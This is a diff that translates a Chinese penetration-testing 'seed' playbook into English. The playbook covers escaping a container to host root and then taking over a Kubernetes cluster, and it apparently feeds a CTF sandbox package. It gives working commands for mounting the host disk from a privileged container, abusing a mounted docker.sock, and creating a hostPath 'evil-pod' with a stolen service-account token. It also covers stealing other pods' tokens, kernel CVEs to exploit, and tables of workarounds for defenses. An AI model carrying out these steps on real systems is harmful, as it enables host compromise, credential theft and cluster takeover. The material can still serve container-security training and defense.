@@ -1,109 +1,109 @@
-# [种子] 容器逃逸 → 拿宿主机 root（cap_sys_admin / 特权容器 / docker.sock）
+# [Seed] Container escape → obtain host root (cap_sys_admin / privileged container / docker.sock)
 
-## 场景分类
-渗透测试 / 云原生 / 容器安全
+## Scene classification
+Penetration Testing/Cloud Native/Container Security
 
-## 目标概述
-拿到一个容器内的 shell（通过应用漏洞 / 暴露的 Jenkins / 或 K8s 上的 RCE），需要从容器逃逸到宿主机，进而横向控制整个 K8s 集群。
+## Goal overview
+Obtain a shell in a container (through an application vulnerability, exposed Jenkins, or RCE on Kubernetes), escape to the host, then move laterally across the cluster.
 
-## 完整执行链路
+## Complete workflow
 
-1. 进容器后第一时间踩点
+1. Perform initial reconnaissance immediately after entering the container
    ```bash
-   id                                    # 是不是 root？
-   cat /proc/self/status | grep CapEff   # 看 capabilities
-   capsh --print                         # 同上更友好
-   ls -la /var/run/docker.sock           # 是不是挂了 Docker socket？
-   mount | grep -v proc                  # 看挂载哪些宿主机目录
-   cat /proc/1/cgroup                    # 是 docker / containerd / kubepods？
-   env | grep -i 'kube\|docker\|aws\|az' # 服务账号 / 元数据 token
+   id                                    # Is this root?
+   cat /proc/self/status | grep CapEff   # Inspect capabilities
+   capsh --print                         # Same as above, with more readable output
+   ls -la /var/run/docker.sock           # Is the Docker socket mounted?
+   mount | grep -v proc                  # See which host directories are mounted
+   cat /proc/1/cgroup                    # Is this docker, containerd, or kubepods?
+   env | grep -i 'kube\|docker\|aws\|az' # Service account / metadata token
    ls /var/run/secrets/kubernetes.io/serviceaccount/  # K8s SA token
    ```
-2. 按检测结果选逃逸路径：
+2. Select the escape path according to the detection results:
 
-   **路径 A：特权容器（`--privileged`）**
+   **Path A: Privileged Container (`--privileged`)**
    ```bash
-   # 直接 mount 宿主机磁盘
+   # Directly mount the host disk
    mkdir /host && mount /dev/sda1 /host
    chroot /host
-   # 现在你是宿主机 root
+   # Now you are the host root
    ```
 
-   **路径 B：cap_sys_admin / cap_dac_read_search**
+   **Path B: cap_sys_admin/cap_dac_read_search**
    ```bash
-   # 利用 release_agent 绕过（CVE-2022-0492 类）
-   # 利用 cap_sys_admin 直接 mount
+   # Bypass using release_agent (CVE-2022-0492 class)
+   # Use cap_sys_admin to mount directly
    ```
 
-   **路径 C：挂了 docker.sock**
+   **Path C: docker.sock hung**
    ```bash
    docker -H unix:///var/run/docker.sock run -v /:/host alpine chroot /host bash
    ```
 
-   **路径 D：K8s SA token 有过权限**
+   **Path D: K8s SA token has permission**
    ```bash
    TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
    kubectl --token=$TOKEN auth can-i --list
-   # 如果能 create pod → 用 hostPID/hostNetwork/hostPath 起特权 pod 逃逸
+   # If you can create pod → use hostPID/hostNetwork/hostPath to enable privileged pod escape
    ```
 
-   **路径 E：kernel exploit（Dirty Pipe / Dirty COW / OverlayFS）**
+   **Path E: kernel exploit (Dirty Pipe/Dirty COW/OverlayFS)**
    ```bash
-   uname -a               # 看内核版本
-   # 选择对应 CVE 的现成 exploit
+   uname -a               # Check the kernel version
+   # Select a ready-made exploit corresponding to the CVE
    ```
 
-3. 逃出来后，在宿主机上找下一跳
-   - kubelet 凭据 (/var/lib/kubelet)
+3. After escaping, find the next jump on the host machine
+   - kubelet credentials (/var/lib/kubelet)
    - container runtime socket (containerd / dockerd)
-   - 其他 pod 的 token
-   - hostNetwork → 直连集群所有 service IP
-4. 横向扩散到整个 K8s
+   - Tokens of other pods
+   - hostNetwork → Directly connect to all service IPs in the cluster
+4. Spread laterally to the entire K8s
 
-## 踩坑记录
+## Lessons learned
 
-| 问题 | 原因 | 解决方案 | 耗时 |
+| Problem | Cause | Solution | Time consuming |
 |------|------|---------|------|
-| 容器是非 root，capabilities 都是空 | 应用层加固较好 | 找 setuid 二进制 / kernel 漏洞 / 容器外部漏洞 | 数小时 |
-| 看到 docker.sock 但读不了 | sock 是 root:root 660 | 当前 uid 加入 docker 组（如果有 setgid 程序）or 利用其他容器 | 30min |
-| 起了特权 pod 但镜像下载失败 | 内网集群，docker registry 内部 | 用集群里已有的镜像（kube-system 下随便挑） | 20min |
-| K8s SA token 没权限 | 默认 SA 通常是 default/restricted | 试 list pods → 找有 cluster-admin 的 pod → 偷它的 SA token | 1h |
-| chroot 后没有常用工具 | 宿主机是极简发行版 | mount /proc /dev /sys 后再用 chroot；或者直接在原 ns 操作 /host | 30min |
-| 集群有 PodSecurity Standards | restricted 策略禁了 hostPath / privileged | 看是否有 namespace 的 admission 配置宽松；找带 deployment 创建权限的 SA | 数小时 |
+| Container is non-root and all capabilities are empty | Application is well hardened | Look for setuid binaries, kernel vulnerabilities, or other container escape vectors | Several hours |
+| Can see docker.sock but cannot read it | Socket is root:root 660 | Add the current user to the docker group (if a setgid program is available) or use another container | 30 min |
+| Privileged pod started but image download failed | Internal cluster uses an internal Docker registry | Use an image already present in the cluster (for example, one under kube-system) | 20 min |
+| K8s service-account token has no permissions | Default service accounts are usually default/restricted | List pods → find a pod with cluster-admin → obtain its service-account token | 1 hour |
+| No common tools after chroot | Host is a minimal distribution | Mount /proc, /dev, and /sys before chroot, or operate directly in the original namespace at /host | 30 min |
+| Cluster uses PodSecurity Standards | Restricted policy blocks hostPath / privileged | Check whether the namespace has permissive admission settings; find a service account allowed to create deployments | Several hours |
 
-## 工具链发现
+## Toolchain discovery
 
-- **deepce** 容器逃逸自动化检测（一个 sh 脚本，无依赖）
-- **kdigger** Kubernetes/容器侦察工具，输出结构化结果
-- **peirates** K8s 渗透专用 TUI
-- **kube-hunter** Aqua 出品，扫集群安全问题
-- **botb (break out the box)** 老牌容器逃逸工具
-- **cdk** 容器渗透瑞士军刀（中文项目，覆盖中国云厂商场景）
+- **deepce** Container escape automated detection (an sh script, no dependencies)
+- **kdigger** Kubernetes/container reconnaissance tool that outputs structured results
+- **peirates** K8s penetration-specific TUI
+- **kube-hunter** Produced by Aqua, scans cluster security issues
+- **botb (break out the box)** Old container escape tool
+- **cdk** Container Penetration Swiss Army Knife (Chinese project, covering Chinese cloud vendor scenarios)
 
-## 关键代码/命令
+## Key code/command
 
-一键自检：
+One-click self-test:
 
 ```bash
-# 拉 deepce（不依赖任何东西）
+# Pull deepce (does not depend on anything)
 wget https://github.com/stealthcopter/deepce/raw/main/deepce.sh
 chmod +x deepce.sh
 ./deepce.sh
-# 输出：检测到 N 个逃逸路径
+# Output: N escape paths detected
 ```
 
-用 K8s SA token 起特权 pod 逃逸：
+Use K8s SA token to enable privileged pod escape:
 
 ```bash
 TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
 APISERVER=https://kubernetes.default.svc
 
-# 检查权限
+# Check permissions
 curl -sk --header "Authorization: Bearer $TOKEN" \
   $APISERVER/apis/authorization.k8s.io/v1/selfsubjectrulesreviews \
   -X POST -d '{"spec":{"namespace":"default"}}'
 
-# 如果能 create pod，用 hostPath 挂宿主机
+# If you can create pod, use hostPath to hang the host
 cat <<EOF > evil-pod.yaml
 apiVersion: v1
 kind: Pod
@@ -132,53 +132,53 @@ curl -sk --header "Authorization: Bearer $TOKEN" \
   -X POST $APISERVER/api/v1/namespaces/default/pods \
   --data-binary @evil-pod.yaml
 
-# 然后 exec 进 evil pod，chroot /host
+# Then exec into evil pod and chroot /host
 ```
 
-CVE-2022-0492 利用（cap_sys_admin + 不带 user namespace）：
+CVE-2022-0492 exploit (cap_sys_admin + without user namespace):
 
 ```bash
-# 见 https://github.com/PaloAltoNetworks/cve-2022-0492
-# 核心：mount cgroup → 写 release_agent → 触发空 cgroup → 在宿主机上下文执行
+# See https://github.com/PaloAltoNetworks/cve-2022-0492
+# Core: mount cgroup → write release_agent → trigger empty cgroup → execute in host context
 ```
 
-## 对本包的改进建议
+## Suggestions for improvements to this package
 
-- 已有 `CTF-Sandbox-Orchestrator/competition-agent-cloud/`，建议增加 `references/k8s-attack-paths.md`
-- attack-chain 增加"容器逃逸 → 集群接管"完整路径示例
-- bootstrap-manifest 加入 deepce / kdigger / peirates
+- There is already`CTF-Sandbox-Orchestrator/competition-agent-cloud/`, it is recommended to add`references/k8s-attack-paths.md`
+- attack-chain adds "container escape → cluster takeover" full path example
+- bootstrap-manifest added deepce/kdigger/peirates
 
-## 可复用的模式/脚本片段
+## Reusable patterns/script snippets
 
-**容器逃逸 5 路径速查**：
+**Container escape 5 path quick check**:
 
 ```text
-1. 特权容器           → mount /dev/sda1 /host && chroot /host
-2. cap_sys_admin     → CVE-2022-0492 (release_agent) / 自己挂 cgroup
+1. Privileged container → mount /dev/sda1 /host && chroot /host
+2. cap_sys_admin     → CVE-2022-0492 (release_agent) / mount a cgroup yourself
 3. docker.sock       → docker run -v /:/host alpine chroot /host
-4. K8s SA + 权限     → 起 hostPath/privileged pod
+4. K8s SA + permissions → from hostPath/privileged pod
 5. kernel CVE        → DirtyPipe (CVE-2022-0847) / DirtyCred (CVE-2022-2588) / OverlayFS (CVE-2023-0386)
 ```
 
-**逃出来后必看**：
+**Must read after escaping**:
 
 ```text
-- /var/lib/kubelet/pods/        → 偷其他 pod 的 SA token
-- /var/lib/docker/              → 看运行的容器列表
-- ip addr                        → 用 hostNetwork 直接访问 service IP
-- crictl ps                      → containerd 容器列表
-- ps -ef --forest                → 找 kubelet / dockerd 启动参数（含 token）
+- /var/lib/kubelet/pods/ → Steal SA tokens of other pods
+- /var/lib/docker/ → see the list of running containers
+- ip addr → use hostNetwork to directly access service IP
+- crictl ps → containerd container list
+- ps -ef --forest → Find kubelet / dockerd startup parameters (including token)
 ```
 
-## 进化动作
-- [ ] CTF-Sandbox-Orchestrator/competition-agent-cloud 增加 k8s-attack-paths.md
-- [ ] attack-chain 增加容器逃逸 → 集群接管路径
-- [ ] bootstrap-manifest 增加 deepce/kdigger/peirates
+## evolution action
+- [ ] CTF-Sandbox-Orchestrator/competition-agent-cloud Add k8s-attack-paths.md
+- [ ] attack-chain adds container escape → cluster takeover path
+- [ ] bootstrap-manifest adds deepce/kdigger/peirates
 
-## 环境信息
-- 攻击位置: 容器内（任何 shell 入口都可）
-- 目标: K8s 1.24+ / Docker 20+ / containerd 1.6+
-- 内核: 视目标而定，关注 CVE-2022-0492 / CVE-2022-0847 / CVE-2023-0386 时间窗
+## environmental information
+- Attack location: Inside the container (any shell entry is acceptable)
+- Target: K8s 1.24+ / Docker 20+ / containerd 1.6+
+- Kernel: Depending on the target, focus on CVE-2022-0492 / CVE-2022-0847 / CVE-2023-0386 window
 
-## 脱敏要求
-本条目为种子数据，基于公开容器/K8s 安全研究编写，不涉及任何真实集群。
+## redaction requirements
+This article is seed data, written based on public container/K8s security research, and does not involve any real clusters.
